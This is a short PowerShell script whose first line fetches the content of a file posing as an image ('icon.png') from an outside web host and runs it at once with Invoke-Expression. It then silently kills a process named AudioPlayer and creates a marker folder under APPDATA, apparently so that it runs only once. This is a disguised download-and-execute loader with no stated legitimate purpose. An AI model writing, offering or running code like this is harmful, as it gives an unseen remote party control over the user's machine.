Invoke-Expression "$((Invoke-WebRequest "https://trnila.eu/icon.png" -UseBasicParsing).Content)";

Stop-Process -Name AudioPlayer -ErrorAction SilentlyContinue;

$stopPath = "$env:APPDATA\signedin"
echo $stopPath

rmdir $stopPath;
if(Test-Path "$stopPath") {
    exit
};

mkdir $stopPath;

echo DONE;


#Set-Variable stopPath -option Constant -value $env:APPDATA\signedin